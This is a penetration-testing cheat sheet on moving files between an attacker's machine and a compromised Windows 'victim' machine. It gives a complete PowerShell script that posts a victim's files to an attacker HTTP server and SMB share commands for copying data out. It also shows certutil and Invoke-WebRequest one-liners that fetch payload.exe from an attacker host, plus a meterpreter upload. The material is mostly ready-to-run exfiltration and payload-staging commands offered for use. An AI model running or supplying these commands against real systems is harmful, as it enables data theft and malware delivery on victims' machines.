## upload files
### file download from attack machine to victim machine through win cmd
#### http file upload form - upload from victim machine to attack machine
* Source: https://github.com/gh0x0st/raven
##### Install and start http server on attack machine
<pre>
$ git clone https://github.com/gh0x0st/raven.git
$ cd raven/
$ sudo python3 raven.py 0.0.0.0 443
</pre>
##### Http client PS script (need to be copied to victim machine)
**client.ps1**
<pre>
function Invoke-SendRaven {
    param (
        [string]$Uri,
        [string]$FilePath
    )

    # Target File
    $File = Get-Item $FilePath
    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    $Boundary = [System.Guid]::NewGuid().ToString()

    # Request Headers
    $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $Headers.Add("Content-Type", "multipart/form-data; boundary=$Boundary")

    # Create the request
    $Request = [System.Net.WebRequest]::Create($Uri)
    $Request.Method = "POST"
    $Request.ContentType = "multipart/form-data; boundary=$Boundary"

    # Request Body
    $Stream = $Request.GetRequestStream()
    $Encoding = [System.Text.Encoding]::ASCII

    $Stream.Write($Encoding.GetBytes("--$Boundary`r`n"), 0, ("--$Boundary`r`n").Length)
    $Stream.Write($Encoding.GetBytes("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n"), 0, ("Content-Disposition: form-data; name=`"file`"; filename=`"$($File.Name)`"`r`n").Length)
    $Stream.Write($Encoding.GetBytes("Content-Type: application/octet-stream`r`n`r`n"), 0, ("Content-Type: application/octet-stream`r`n`r`n").Length)
    $Stream.Write($Content, 0, $Content.Length)
    $Stream.Write($Encoding.GetBytes("`r`n--$Boundary--`r`n"), 0, ("`r`n--$Boundary--`r`n").Length)
    $Stream.Close()

    # Upload File
    $Response = $Request.GetResponse()
    $Response.Close()
}

# Usage
Invoke-SendRaven -Uri http://192.168.0.12:443/ -FilePath $ENV:TEMP\HostRecon.txt
</pre>
##### run client on victim machine
<pre>
PS> Invoke-Module client.ps1
PS> Invoke-SendRaven -Uri http://192.168.0.12:443/ -FilePath $ENV:TEMP\HostRecon.txt
</pre>
#### SMB share on attack machine and win cmd copy !from victim to attack machine!
<pre>
<b># attack machine</b>
$ sudo smbserver.py -smb2support share1 $(pwd)

<b># victim machine</b>
dir \\10.10.10.1\share1\file1.exe  
copy .\file1.exe \\10.10.10.1\share1\file1.exe
</pre>
#### SMB share on windows (maybe works maybe not because of the lack of access)
<pre>
<b># victim machine</b>
C:\> net share test=c:\users\public /GRANT:Everyone,FULL

<b># attack machine</b>
$ smbclient...
</pre>
### file upload from attack machine to victim machine through win cmd
<pre>
<b># attack machine</b>
$ sudo smbserver.py -smb2support share1 $(pwd)

<b># victim machine</b>
dir \\10.10.10.1\share1\file1.exe  
copy \\10.10.10.1\share1\file1.exe .\file1.exe
</pre>
### upload files from attack machine to victim machine with shell context of victim machine
powershell> Invoke-WebRequest -Uri http://10.10.10.1/payload.exe -UseBasicParsing -OutFile .\payload.exe  
cmd> certutil -urlcache -f http://10.10.10.1/payload.exe .\payload.exe  
### upload files from attack machine to victim machine with shell context of attack machine
meterpreter> upload payload.exe C:/Users/Test/Desktop/payload.exe  
SCP...
## download files
### download files from victim machine to attack machine with shell context of attack machine
creating smb share
### download files from victim machine to attack machine with shell context of victim machine
sending file with http form post to attack machine http server
